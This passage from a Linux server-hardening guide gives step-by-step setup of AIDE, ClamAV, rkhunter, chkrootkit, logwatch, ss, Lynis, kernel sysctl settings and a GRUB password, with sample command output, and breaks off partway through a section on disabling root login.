E/i5ceF3YTjwenBfyxHEsy9Kzu35VTf7\\n > CPGQSW4tl14=\\n > GOST : n5Ityzxey9/1jIs7LMc08SULF1sLBFUc\\n > aMv7Oby604A=\\n > \\n > \\n > End timestamp: 2019-04-01 21:24:45 -0400 (run time: 1m 8s)\\n > ```\\n\\n1. Test everything works with no changes.\\n\\n On Debian based systems:\\n\\n ``` bash\\n sudo aide.wrapper --check\\n ```\\n \\n > ```\\n > Start timestamp: 2019-04-01 21:24:45 -0400 (AIDE 0.16)\\n > AIDE found NO differences between database and filesystem. Looks okay!!\\n > Verbose level: 6\\n > \\n > Number of entries: 25973\\n > \\n > ---------------------------------------------------\\n > The attributes of the (uncompressed) database(s):\\n > ---------------------------------------------------\\n > \\n > /var/lib/aide/aide.db\\n > RMD160 : moyQ1YskQQbidX+Lusv3g2wf1gQ=\\n > TIGER : 7WoOgCrXzSpDrlO6I3PyXPj1gRiaMSeo\\n > SHA256 : gVx8Fp7r3800WF2aeXl+/KHCzfGsNi7O\\n > g16VTPpIfYQ=\\n > SHA512 : GYfa0DJwWgMLl4Goo5VFVOhu4BphXCo3\\n > rZnk49PYztwu50XjaAvsVuTjJY5uIYrG\\n > tV+jt3ELvwFzGefq4ZBNMg==\\n > CRC32 : /cusZw==\\n > HAVAL : E/i5ceF3YTjwenBfyxHEsy9Kzu35VTf7\\n > CPGQSW4tl14=\\n > GOST : n5Ityzxey9/1jIs7LMc08SULF1sLBFUc\\n > aMv7Oby604A=\\n > \\n > \\n > End timestamp: 2019-04-01 21:26:03 -0400 (run time: 1m 18s)\\n > ```\\n\\n1. Test everything works after making some changes.\\n\\n On Debian based systems:\\n\\n ``` bash\\n sudo touch /etc/test.sh\\n sudo touch /root/test.sh\\n \\n sudo aide.wrapper --check\\n \\n sudo rm /etc/test.sh\\n sudo rm /root/test.sh\\n \\n sudo aideinit -y -f\\n ```\\n \\n > ```\\n > Start timestamp: 2019-04-01 21:37:37 -0400 (AIDE 0.16)\\n > AIDE found differences between database and filesystem!!\\n > Verbose level: 6\\n > \\n > Summary:\\n > Total number of entries: 25972\\n > Added entries: 2\\n > Removed entries: 0\\n > Changed entries: 1\\n > \\n > ---------------------------------------------------\\n > Added entries:\\n > ---------------------------------------------------\\n > \\n > f++++++++++++++++: /etc/test.sh\\n > f++++++++++++++++: /root/test.sh\\n > \\n > ---------------------------------------------------\\n > Changed entries:\\n > ---------------------------------------------------\\n > \\n > d =.... mc.. .. .: /root\\n > \\n > ---------------------------------------------------\\n > Detailed information about changes:\\n > ---------------------------------------------------\\n > \\n > Directory: /root\\n > Mtime : 2019-04-01 21:35:07 -0400 | 2019-04-01 21:37:36 -0400\\n > Ctime : 2019-04-01 21:35:07 -0400 | 2019-04-01 21:37:36 -0400\\n > \\n > \\n > ---------------------------------------------------\\n > The attributes of the (uncompressed) database(s):\\n > ---------------------------------------------------\\n > \\n > /var/lib/aide/aide.db\\n > RMD160 : qF9WmKaf2PptjKnhcr9z4ueCPTY=\\n > TIGER : zMo7MvvYJcq1hzvTQLPMW7ALeFiyEqv+\\n > SHA256 : LSLLVjjV6r8vlSxlbAbbEsPcQUB48SgP\\n > pdVqEn6ZNbQ=\\n > SHA512 : Qc4U7+ZAWCcitapGhJ1IrXCLGCf1IKZl\\n > 02KYL1gaZ0Fm4dc7xLqjiquWDMSEbwzW\\n > oz49NCquqGz5jpMIUy7UxA==\\n > CRC32 : z8ChEA==\\n > HAVAL : YapzS+/cdDwLj3kHJEq8fufLp3DPKZDg\\n > U12KCSkrO7Y=\\n > GOST : 74sLV4HkTig+GJhokvxZQm7CJD/NR0mG\\n > 6jV7zdt5AXQ=\\n > \\n > \\n > End timestamp: 2019-04-01 21:38:50 -0400 (run time: 1m 13s)\\n > ```\\n \\n1. That's it. If you set `CRON_DAILY_RUN` to `yes` in `/etc/default/aide` then cron will execute `/etc/cron.daily/aide` every day and e-mail you the output.\\n\\n#### Updating The Database\\n\\nEvery time you make changes to files/folders that AIDE monitors, you will need to update the database to capture those changes. To do that on Debian based systems:\\n\\n``` bash\\nsudo aideinit -y -f\\n```\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Anti-Virus Scanning With ClamAV (WIP)\\n\\n#### Why\\n\\nWIP\\n\\n#### How It Works\\n\\n- ClamAV is a virus scanner\\n- ClamAV-Freshclam is a service that keeps the virus definitions updated\\n- ClamAV-Daemon keeps the `clamd` process running to make scanning faster\\n\\n#### Goals\\n\\nWIP\\n\\n#### Notes\\n\\n- These instructions **do not** tell you how to enable the ClamAV daemon service to ensure `clamd` is running all the time. `clamd` is only if you're running a mail server and does not provide real-time monitoring of files. Instead, you'd want to scan files manually or on a schedule.\\n\\n#### References\\n\\n- https://www.clamav.net/documents/installation-on-debian-and-ubuntu-linux-distributions\\n- https://wiki.debian.org/ClamAV\\n- https://www.osradar.com/install-clamav-debian-9-ubuntu-18/\\n- https://www.lisenet.com/2014/automate-clamav-to-perform-daily-system-scan-and-send-email-notifications-on-linux/\\n- https://www.howtoforge.com/tutorial/configure-clamav-to-scan-and-notify-virus-and-malware/\\n- https://serverfault.com/questions/741299/is-there-a-way-to-keep-clamav-updated-on-debian-8\\n- https://askubuntu.com/questions/250290/how-do-i-scan-for-viruses-with-clamav\\n- https://ngothang.com/how-to-install-clamav-and-configure-daily-scanning-on-centos/\\n\\n#### Steps\\n\\n1. Install ClamAV.\\n\\n On Debian based systems:\\n\\n ``` bash\\n sudo apt install clamav clamav-freshclam clamav-daemon\\n ```\\n\\n1. Make a backup of `clamav-freshclam`'s configuration file `/etc/clamav/freshclam.conf`:\\n\\n ``` bash\\n sudo cp --archive /etc/clamav/freshclam.conf /etc/clamav/freshclam.conf-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n \\n1. `clamav-freshclam`'s default settings are probably good enough but if you want to change them, you can either edit the file `/etc/clamav/freshclam.conf` or use `dpkg-reconfigure`:\\n\\n ``` bash\\n sudo dpkg-reconfigure clamav-freshclam\\n ```\\n \\n **Note**: The default settings will update the definitions 24 times in a day. To change the interval, check the `Checks` setting in `/etc/clamav/freshclam.conf` or use `dpkg-reconfigure`.\\n\\n1. Start the `clamav-freshclam` service:\\n\\n ``` bash\\n sudo service clamav-freshclam start\\n ```\\n \\n1. You can make sure `clamav-freshclam` running:\\n\\n ``` bash\\n sudo service clamav-freshclam status\\n ```\\n \\n > ```\\n > \\u25cf clamav-freshclam.service - ClamAV virus database updater\\n > Loaded: loaded (/lib/systemd/system/clamav-freshclam.service; enabled; vendor preset: enabled) Active: active (running) since Sat 2019-03-16 22:57:07 EDT; 2min 13s ago\\n > Docs: man:freshclam(1)\\n > man:freshclam.conf(5)\\n > https://www.clamav.net/documents\\n > Main PID: 1288 (freshclam)\\n > CGroup: /system.slice/clamav-freshclam.service\\n > \\u2514\\u25001288 /usr/bin/freshclam -d --foreground=true\\n > \\n > Mar 16 22:57:08 host freshclam[1288]: Sat Mar 16 22:57:08 2019 -> ^Local version: 0.100.2 Recommended version: 0.101.1\\n > Mar 16 22:57:08 host freshclam[1288]: Sat Mar 16 22:57:08 2019 -> DON'T PANIC! Read https://www.clamav.net/documents/upgrading-clamav\\n > Mar 16 22:57:15 host freshclam[1288]: Sat Mar 16 22:57:15 2019 -> Downloading main.cvd [100%]\\n > Mar 16 22:57:38 host freshclam[1288]: Sat Mar 16 22:57:38 2019 -> main.cvd updated (version: 58, sigs: 4566249, f-level: 60, builder: sigmgr)\\n > Mar 16 22:57:40 host freshclam[1288]: Sat Mar 16 22:57:40 2019 -> Downloading daily.cvd [100%]\\n > Mar 16 22:58:13 host freshclam[1288]: Sat Mar 16 22:58:13 2019 -> daily.cvd updated (version: 25390, sigs: 1520006, f-level: 63, builder: raynman)\\n > Mar 16 22:58:14 host freshclam[1288]: Sat Mar 16 22:58:14 2019 -> Downloading bytecode.cvd [100%]\\n > Mar 16 22:58:16 host freshclam[1288]: Sat Mar 16 22:58:16 2019 -> bytecode.cvd updated (version: 328, sigs: 94, f-level: 63, builder: neo)\\n > Mar 16 22:58:24 host freshclam[1288]: Sat Mar 16 22:58:24 2019 -> Database updated (6086349 signatures) from db.local.clamav.net (IP: 104.16.219.84)\\n > Mar 16 22:58:24 host freshclam[1288]: Sat Mar 16 22:58:24 2019 -> ^Clamd was NOT notified: Can't connect to clamd through /var/run/clamav/clamd.ctl: No such file or directory\\n > ```\\n \\n **Note**: Don't worry about that `Local version` line. Check https://serverfault.com/questions/741299/is-there-a-way-to-keep-clamav-updated-on-debian-8 for more details.\\n\\n1. Make a backup of `clamav-daemon`'s configuration file `/etc/clamav/clamd.conf`:\\n\\n ``` bash\\n sudo cp --archive /etc/clamav/clamd.conf /etc/clamav/clamd.conf-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n \\n1. You can change `clamav-daemon`'s settings by editing the file `/etc/clamav/clamd.conf` or useing `dpkg-reconfigure`:\\n\\n ``` bash\\n sudo dpkg-reconfigure clamav-daemon\\n ```\\n\\n#### Scanning Files/Folders\\n\\n- To scan files/folders use the `clamscan` program.\\n- `clamscan` runs as the user it is executed as so it needs read permissions to the files/folders it is scanning. \\n- Using `clamscan` as `root` is dangerous because if a file is in fact a virus there is risk that it could use the root privileges.\\n- To scan a file: `clamscan /path/to/file`.\\n- To scan a directory: `clamscan -r /path/to/folder`.\\n- You can use the `-i` switch to only print infected files.\\n- Check `clamscan`'s `man` pages for other switches/options.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Rootkit Detection With Rkhunter (WIP)\\n\\n#### Why\\n\\nWIP\\n\\n#### How It Works\\n\\nWIP\\n\\n#### Goals\\n\\nWIP\\n\\n#### References\\n\\n- http://rkhunter.sourceforge.net/\\n- https://www.cyberciti.biz/faq/howto-check-linux-rootkist-with-detectors-software/\\n- https://www.tecmint.com/install-rootkit-hunter-scan-for-rootkits-backdoors-in-linux/\\n\\n#### Steps\\n\\n1. Install Rkhunter.\\n\\n On Debian based systems:\\n \\n ``` bash\\n sudo apt install rkhunter\\n ```\\n\\n1. Make a backup of rkhunter' defaults file:\\n\\n ``` bash\\n sudo cp -p /etc/default/rkhunter /etc/default/rkhunter-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. rkhunter's configuration file is `/etc/rkhunter.conf`. Instead of making changes to it, create and use the file `/etc/rkhunter.conf.local` instead:\\n\\n ``` bash\\n sudo cp -p /etc/rkhunter.conf /etc/rkhunter.conf.local\\n ```\\n \\n1. Go through the configuration file `/etc/rkhunter.conf.local` and set to your requirements. My recommendations:\\n\\n |Setting|Note|\\n |--|--|\\n |`UPDATE_MIRRORS=1`||\\n |`MIRRORS_MODE=0`||\\n |`MAIL-ON-WARNING=root`||\\n |`COPY_LOG_ON_ERROR=1`|to save a copy of the log if there is an error|\\n |`PKGMGR=...`|set to the appropriate value per the documentation|\\n |`PHALANX2_DIRTEST=1`|read the documentation for why|\\n |`WEB_CMD=\\\"\\\"`|this is to address an issue with the Debian package that disables the ability for rkhunter to self-update.| \\n |`USE_LOCKING=1`|to prevent issues with rkhunter running multiple times|\\n |`SHOW_SUMMARY_WARNINGS_NUMBER=1`|to see the actual number of warnings found|\\n\\n1. You want rkhunter to run every day and e-mail you the result. You can write your own script or check https://www.tecmint.com/install-rootkit-hunter-scan-for-rootkits-backdoors-in-linux/ for a sample cron script you can use.\\n \\n On Debian based system, rkhunter comes with cron scripts. To enable them check `/etc/default/rkhunter` or use `dpkg-reconfigure` and say `Yes` to all of the questions:\\n \\n ``` bash\\n sudo dpkg-reconfigure rkhunter\\n ```\\n\\n1. After you've finished with all of the changes, make sure all the settings are valid:\\n\\n ``` bash\\n sudo rkhunter -C\\n ```\\n\\n1. Update rkhunter and its database:\\n\\n ``` bash\\n sudo rkhunter --versioncheck\\n sudo rkhunter --update\\n sudo rkhunter --propupd\\n ```\\n\\n1. If you want to do a manual scan and see the output:\\n\\n ``` bash\\n sudo rkhunter --check\\n ```\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Rootkit Detection With chrootkit (WIP)\\n\\n#### Why\\n\\nWIP\\n\\n#### How It Works\\n\\nWIP\\n\\n#### Goals\\n\\nWIP\\n\\n#### References\\n\\n- http://www.chkrootkit.org/\\n- https://www.cyberciti.biz/faq/howto-check-linux-rootkist-with-detectors-software/\\n- https://askubuntu.com/questions/258658/eth0-packet-sniffer-sbin-dhclient\\n\\n#### Steps\\n\\n1. Install chkrootkit.\\n\\n On Debian based systems:\\n \\n ``` bash\\n sudo apt install chkrootkit\\n ```\\n\\n1. Do a manual scan:\\n\\n ``` bash\\n sudo chkrootkit\\n ```\\n \\n > ```\\n > ROOTDIR is `/'\\n > Checking `amd'... not found\\n > Checking `basename'... not infected\\n > Checking `biff'... not found\\n > Checking `chfn'... not infected\\n > Checking `chsh'... not infected\\n > ...\\n > Checking `scalper'... not infected\\n > Checking `slapper'... not infected\\n > Checking `z2'... chklastlog: nothing deleted\\n > Checking `chkutmp'... chkutmp: nothing deleted\\n > Checking `OSX_RSPLUG'... not infected\\n > ```\\n\\n1. Make a backup of chkrootkit's configuration file `/etc/chkrootkit.conf`:\\n\\n ``` bash\\n sudo cp --archive /etc/chkrootkit.conf /etc/chkrootkit.conf-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. You want chkrootkit to run every day and e-mail you the result.\\n \\n On Debian based system, chkrootkit comes with cron scripts. To enable them check `/etc/chkrootkit.conf` or use `dpkg-reconfigure` and say `Yes` to the first question:\\n \\n ``` bash\\n sudo dpkg-reconfigure chkrootkit\\n ```\\n\\n([Table of Contents](#table-of-contents))\\n\\n### logwatch - system log analyzer and reporter\\n\\n#### Why\\n\\nYour server will be generating a lot of logs that may contain important information. Unless you plan on checking your server everyday, you'll want a way to get e-mail summary of your server's logs. To accomplish this we'll use [logwatch](https://sourceforge.net/projects/logwatch/).\\n\\n#### How It Works\\n\\nlogwatch scans system log files and summarizes them. You can run it directly from the command line or schedule it to run on a recurring schedule. logwatch uses service files to know how to read/summarize a log file. You can see all of the stock service files in `/usr/share/logwatch/scripts/services`.\\n\\nlogwatch's configuration file `/usr/share/logwatch/default.conf/logwatch.conf` specifies default options. You can override them via command line arguments.\\n\\n#### Goals\\n\\n- Logwatch configured to send a daily e-mail summary of all of the server's status and logs\\n\\n#### Notes\\n\\n- Your server will need to be able to send e-mails for this to work\\n- The below steps will result in logwatch running every day. If you want to change the schedule, modify the cronjob to your liking. You'll also want to change the `range` option to cover your recurrence window. See https://www.badpenguin.org/configure-logwatch-for-weekly-email-and-html-output-format for an example.\\n- If logwatch fails to deliver mail due to the e-mail having long lines please check https://blog.dhampir.no/content/exim4-line-length-in-debian-stretch-mail-delivery-failed-returning-message-to-sender as documented in [issue #29](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/issues/29). If you you followed [Gmail and Exim4 As MTA With Implicit TLS](#gmail-and-exim4-as-mta-with-implicit-tls) then we already took care of this in step #7.\\n\\n#### References\\n\\n- Thanks to [amacheema](https://github.com/amacheema) for fixing some issues with the steps and letting me know of a long line bug with exim4 as documented in [issue #29](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/issues/29).\\n- https://sourceforge.net/projects/logwatch/\\n- https://www.digitalocean.com/community/tutorials/how-to-install-and-use-logwatch-log-analyzer-and-reporter-on-a-vps\\n\\n#### Steps\\n\\n1. Install logwatch.\\n\\n On Debian based systems:\\n\\n ``` bash\\n sudo apt install logwatch\\n ```\\n\\n1. To see a sample of what logwatch collects you can run it directly:\\n\\n ``` bash\\n sudo /usr/sbin/logwatch --output stdout --format text --range yesterday --service all\\n ```\\n\\n > ```\\n > \\n > ################### Logwatch 7.4.3 (12/07/16) ####################\\n > Processing Initiated: Mon Mar 4 00:05:50 2019\\n > Date Range Processed: yesterday\\n > ( 2019-Mar-03 )\\n > Period is day.\\n > Detail Level of Output: 5\\n > Type of Output/Format: stdout / text\\n > Logfiles for Host: host\\n > ##################################################################\\n > \\n > --------------------- Cron Begin ------------------------\\n > ...\\n > ...\\n > ---------------------- Disk Space End -------------------------\\n > \\n > \\n > ###################### Logwatch End #########################\\n > ```\\n\\n1. Go through logwatch's self-documented configuration file `/usr/share/logwatch/default.conf/logwatch.conf` before continuing. There is no need to change anything here but pay special attention to the `Output`, `Format`, `MailTo`, `Range`, and `Service` as those are the ones we'll be using. For our purposes, instead of specifying our options in the configuration file, we will pass them as command line arguments in the daily cron job that executes logwatch. That way, if the configuration file is ever modified (e.g. during an update), our options will still be there.\\n\\n1. Make a backup of logwatch's daily cron file `/etc/cron.daily/00logwatch` and unset the execute bit:\\n\\n ``` bash\\n sudo cp --archive /etc/cron.daily/00logwatch /etc/cron.daily/00logwatch-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n sudo chmod -x /etc/cron.daily/00logwatch.*\\n ```\\n\\n1. By default, logwatch outputs to `stdout`. Since the goal is to get a daily e-mail, we need to change the output type that logwatch uses to send e-mail instead. We could do this through the configuration file above, but that would apply to every time it is run -- even when we run it manually and want to see the output to the screen. Instead, we'll change the cron job that executes logwatch to send e-mail. This way, when run manually, we'll still get output to `stdout` and when run by cron, it'll send an e-mail. We'll also make sure it checks for all services, and change the output format to html so it's easier to read regardless of what the configuration file says. In the file `/etc/cron.daily/00logwatch` find the execute line and change it to:\\n\\n ```\\n /usr/sbin/logwatch --output mail --format html --mailto root --range yesterday --service all\\n ```\\n\\n > ```\\n > #!/bin/bash\\n > \\n > #Check if removed-but-not-purged\\n > test -x /usr/share/logwatch/scripts/logwatch.pl || exit 0\\n > \\n > #execute\\n > /usr/sbin/logwatch --output mail --format html --mailto root --range yesterday --service all\\n > \\n > #Note: It's possible to force the recipient in above command\\n > #Just pass --mailto address@a.com instead of --output mail\\n > ```\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n \\n ``` bash\\n sudo sed -i -r -e \\\"s,^($(sudo which logwatch).*?),# \\\\1 # commented by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\\n$(sudo which logwatch) --output mail --format html --mailto root --range yesterday --service all # added by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\"),\\\" /etc/cron.daily/00logwatch\\n ```\\n\\n1. You can test the cron job by executing it:\\n\\n ``` bash\\n sudo /etc/cron.daily/00logwatch\\n ```\\n \\n **Note**: If logwatch fails to deliver mail due to the e-mail having long lines please check https://blog.dhampir.no/content/exim4-line-length-in-debian-stretch-mail-delivery-failed-returning-message-to-sender as documented in [issue #29](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/issues/29). If you you followed [Gmail and Exim4 As MTA With Implicit TLS](#gmail-and-exim4-as-mta-with-implicit-tls) then we already took care of this in step #7.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### ss - Seeing Ports Your Server Is Listening On\\n\\n#### Why\\n\\nPorts are how applications, services, and processes communicate with each other -- either locally within your server or with other devices on the network. When you have an application or service (like SSH or Apache) running on your server, they listen for requests on specific ports.\\n\\nObviously we don't want your server listening on ports we don't know about. We'll use `ss` to see all the ports that services are listening on. This will help us track down and stop rogue, potentially dangerous, services.\\n\\n#### Goals\\n\\n- find out non-localhost what ports are open and listening for connections\\n\\n#### References\\n\\n- https://www.reddit.com/r/linux/comments/arx7st/howtosecurealinuxserver_an_evolving_howto_guide/egrib6o/\\n- https://www.reddit.com/r/linux/comments/arx7st/howtosecurealinuxserver_an_evolving_howto_guide/egs1rev/\\n- https://www.tecmint.com/find-open-ports-in-linux/\\n- `man ss`\\n\\n#### Steps\\n\\n1. To see the all the ports listening for traffic:\\n\\n ``` bash\\n sudo ss -lntup\\n ```\\n \\n > ```\\n > Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port\\n > udp UNCONN 0 0 *:68 *:* users:((\\\"dhclient\\\",pid=389,fd=6))\\n > tcp LISTEN 0 128 *:22 *:* users:((\\\"sshd\\\",pid=4390,fd=3))\\n > tcp LISTEN 0 128 :::22 :::* users:((\\\"sshd\\\",pid=4390,fd=4))\\n > ```\\n \\n **Switch Explanations**:\\n - `l` = display listening sockets\\n - `n` = do now try to resolve service names\\n - `t` = display TCP sockets\\n - `u` = display UDP sockets\\n - `p` = show process information\\n\\n1. If you see anything suspicious, like a port you're not aware of or a process you don't know, investigate and remediate as necessary.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Lynis - Linux Security Auditing\\n\\n#### Why\\n\\nFrom [https://cisofy.com/lynis/](https://cisofy.com/lynis/):\\n\\n> Lynis is a battle-tested security tool for systems running Linux, macOS, or Unix-based operating system. It performs an extensive health scan of your systems to support system hardening and compliance testing.\\n\\n#### Goals\\n\\n- Lynis installed\\n\\n#### Notes\\n\\n- CISOFY offers packages for many distributions. Check https://packages.cisofy.com/ for distribution specific installation instructions.\\n\\n#### References\\n\\n- https://cisofy.com/documentation/lynis/get-started/\\n- https://packages.cisofy.com/community/#debian-ubuntu\\n- https://thelinuxcode.com/audit-lynis-ubuntu-server/\\n- https://www.vultr.com/docs/install-lynis-on-debian-8\\n\\n#### Steps\\n\\n1. Install lynis. https://cisofy.com/lynis/#installation has detailed instructions on how to install it for your distribution.\\n\\n On Debian based systems, using CISOFY's community software repository:\\n\\n ``` bash\\n sudo apt install apt-transport-https ca-certificates host\\n sudo wget -O - https://packages.cisofy.com/keys/cisofy-software-public.key | sudo apt-key add -\\n sudo echo \\\"deb https://packages.cisofy.com/community/lynis/deb/ stable main\\\" | sudo tee /etc/apt/sources.list.d/cisofy-lynis.list\\n sudo apt update\\n sudo apt install lynis host\\n ```\\n\\n1. Update it:\\n\\n ``` bash\\n sudo lynis update info\\n ```\\n\\n1. Run a security audit:\\n\\n ``` bash\\n sudo lynis audit system\\n ```\\n\\n This will scan your server, report its audit findings, and at the end it will give you suggestions. Spend some time going through the output and address gaps as necessary.\\n\\n([Table of Contents](#table-of-contents))\\n\\n## The Danger Zone\\n\\n### Proceed At Your Own Risk\\n\\nThis sections cover things that are high risk because there is a possibility they can make your system unusable, or are considered unnecessary by many because the risks outweigh any rewards.\\n\\n**!! PROCEED AT YOUR OWN RISK !!**\\n\\n<details><summary>!! PROCEED AT YOUR OWN RISK !!</summary>\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Table of Contents\\n\\n- [Linux Kernel sysctl Hardening](#linux-kernel-sysctl-hardening)\\n- [Password Protect GRUB](#password-protect-grub)\\n- [Disable Root Login](#disable-root-login)\\n- [Change Default umask](#change-default-umask)\\n- [Orphaned Software](#orphaned-software)\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Linux Kernel sysctl Hardening\\n\\n<details><summary>!! PROCEED AT YOUR OWN RISK !!</summary>\\n\\n#### Why\\n\\nThe kernel is the brains of a Linux system. Securing it just makes sense.\\n\\n#### Why Not\\n\\nChanging kernel settings with sysctl is risky and could break your server. If you don't know what you are doing, don't have the time to debug issues, or just don't want to take the risks, I would advise from not following these steps.\\n\\n#### Disclaimer\\n\\nI am not as knowledgeable about hardening/securing a Linux kernel as I'd like. As much as I hate to admit it, I do not know what all of these settings do. My understanding is that most of them are general kernel hardening and performance, and the others are to protect against spoofing and DOS attacks.\\n\\nIn fact, since I am not 100% sure exactly what each setting does, I took recommended settings from numerous sites (all linked in the references below) and combined them to figure out what should be set. I figure if multiple reputable sites mention the same setting, it's probably safe.\\n\\nIf you have a better understanding of what these settings do, or have any other feedback/advice on them, please [let me know](#contacting-me).\\n\\nI won't provide [For the lazy](#editing-configuration-files---for-the-lazy) code in this section.\\n\\n#### Notes\\n\\n- Documentation on all the sysctl settings/keys is severely lacking. The [documentation I can find](https://github.com/torvalds/linux/tree/master/Documentation) seems to reference the 2.2 version kernel. I could not find anything newer. If you know where I can, please [let me know](#contacting-me).\\n- The reference sites listed below have more comments on what each setting does.\\n\\n#### References\\n\\n- https://github.com/torvalds/linux/tree/master/Documentation\\n- https://www.cyberciti.biz/faq/linux-kernel-etcsysctl-conf-security-hardening/\\n- https://geektnt.com/sysctl-conf-hardening.html\\n- https://linoxide.com/how-tos/linux-server-protection/\\n- https://github.com/klaver/sysctl/blob/master/sysctl.conf\\n- https://cloudpro.zone/index.php/2018/01/30/debian-9-3-server-setup-guide-part-5/\\n\\n#### Steps\\n\\n1. The sysctl settings can be found in the [linux-kernel-sysctl-hardening.md](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/blob/master/linux-kernel-sysctl-hardening.md) file in this repo.\\n\\n1. Before you make a kernel sysctl change permanent, you can test it with the sysctl command:\\n\\n ``` bash\\n sudo sysctl -w [key=value]\\n ```\\n\\n Example:\\n\\n ``` bash\\n sudo sysctl -w kernel.ctrl-alt-del=0\\n ```\\n\\n **Note**: There are no spaces in `key=value`, including before and after the space.\\n\\n1. Once you have tested a setting, and made sure it works without breaking your server, you can make it permanent by adding the values to `/etc/sysctl.conf`. For example:\\n\\n ``` bash\\n $ sudo cat /etc/sysctl.conf\\n kernel.ctrl-alt-del = 0\\n fs.file-max = 65535\\n ...\\n kernel.sysrq = 0\\n ```\\n\\n1. After updating the file you can reload the settings or reboot. To reload:\\n\\n ``` bash\\n sudo sysctl -p\\n ```\\n\\n**Note**: If sysctl has trouble writing any settings then `sysctl -w` or `sysctl -p` will write an error to stderr. You can use this to quickly find invalid settings in your `/etc/sysctl.conf` file:\\n\\n``` bash\\nsudo sysctl -p >/dev/null\\n```\\n\\n</details><br />\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Password Protect GRUB\\n\\n<details><summary>!! PROCEED AT YOUR OWN RISK !!</summary>\\n\\n#### Why\\n\\nIf a bad actor has physical access to your server, they could use GRUB to gain unauthorized access to your system.\\n\\n#### Why Not\\n\\nIf you forget the password, you'll have to go through [some work](https://www.cyberciti.biz/tips/howto-recovering-grub-boot-loader-password.html) to recover the password.\\n\\n#### Goals\\n\\n- auto boot the default Debian install and require a password for anything else\\n\\n#### Notes\\n\\n- This will only protect GRUB and anything behind it like your operating systems. Check your motherboard's documentation for password protecting your BIOS to prevent a bad actor from circumventing GRUB.\\n\\n#### References\\n\\n- https://selivan.github.io/2017/12/21/grub2-password-for-all-but-default-menu-entries.html\\n- https://help.ubuntu.com/community/Grub2/Passwords\\n- https://computingforgeeks.com/how-to-protect-grub-with-password-on-debian-ubuntu-and-kali-linux/\\n- `man grub`\\n- `man grub-mkpasswd-pbkdf2`\\n\\n#### Steps\\n\\n1. Create a [Password-Based Key Derivation Function 2 (PBKDF2)](https://en.wikipedia.org/wiki/PBKDF2) hash of your password:\\n\\n ``` bash\\n grub-mkpasswd-pbkdf2 -c 100000\\n ```\\n\\n The below output is from using `password` as the password:\\n\\n > ```\\n > Enter password:\\n > Reenter password:\\n > PBKDF2 hash of your password is grub.pbkdf2.sha512.100000.2812C233DFC899EFC3D5991D8CA74068C99D6D786A54F603E9A1EFE7BAEDDB6AA89672F92589FAF98DB9364143E7A1156C9936328971A02A483A84C3D028C4FF.C255442F9C98E1F3C500C373FE195DCF16C56EEBDC55ABDD332DD36A92865FA8FC4C90433757D743776AB186BD3AE5580F63EF445472CC1D151FA03906D08A6D\\n > ```\\n\\n1. Copy everything **after** `PBKDF2 hash of your password is `, **starting from and including** `grub.pbkdf2.sha512...` to the end. You'll need this in the next step.\\n\\n1. The `update-grub` program uses scripts to generate configuration files it will use for GRUB's settings. Create the file `/etc/grub.d/01_password` and add the below code after replacing `[hash]` with the hash you copied from the first step. This tells `update-grub` to use this username and password for GRUB.\\n\\n ``` bash\\n #!/bin/sh\\n set -e\\n\\n cat << EOF\\n set superusers=\\\"grub\\\"\\n password_pbkdf2 grub [hash]\\n EOF\\n ```\\n\\n For example:\\n\\n > ``` bash\\n > #!/bin/sh\\n > set -e\\n > \\n > cat << EOF\\n > set superusers=\\\"grub\\\"\\n > password_pbkdf2 grub grub.pbkdf2.sha512.100000.2812C233DFC899EFC3D5991D8CA74068C99D6D786A54F603E9A1EFE7BAEDDB6AA89672F92589FAF98DB9364143E7A1156C9936328971A02A483A84C3D028C4FF.C255442F9C98E1F3C500C373FE195DCF16C56EEBDC55ABDD332DD36A92865FA8FC4C90433757D743776AB186BD3AE5580F63EF445472CC1D151FA03906D08A6D\\n > EOF\\n > ```\\n\\n1. Set the file's execute bit so `update-grub` includes it when it updates GRUB's configuration:\\n\\n ``` bash\\n sudo chmod a+x /etc/grub.d/01_password\\n ```\\n\\n1. Make a backup of GRUB's configuration file `/etc/grub.d/10_linux` that we'll be modifying and unset the execute bit so `update-grub` doesn't try to run it:\\n\\n ``` bash\\n sudo cp --archive /etc/grub.d/10_linux /etc/grub.d/10_linux-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n sudo chmod a-x /etc/grub.d/10_linux.*\\n ```\\n\\n1. To make the default Debian install unrestricted (**without** the password) while keeping everything else restricted (**with** the password) modify `/etc/grub.d/10_linux` and add `--unrestricted` to the `CLASS` variable.\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n sudo sed -i -r -e \\\"/^CLASS=/ a CLASS=\\\\\\\"\\\\${CLASS} --unrestricted\\\\\\\" # added by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\" /etc/grub.d/10_linux\\n ```\\n\\n1. Update GRUB with `update-grub`:\\n\\n ``` bash\\n sudo update-grub\\n ```\\n\\n</details><br />\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Disable Root Login\\n\\n<details><summary>!! PROCEED AT YOUR OWN RISK !!</summary>\\n\\n#### Why\\n\\nIf you have sudo [configured properly](#limit-who-can-use-sudo), then the **root** account will mostly never need to log in directly -- either at the terminal or remotely.\\n\\n#### Why Not\\n\\n**Be warned, this can cause issues with some configurations!**\\n\\nIf your installation uses 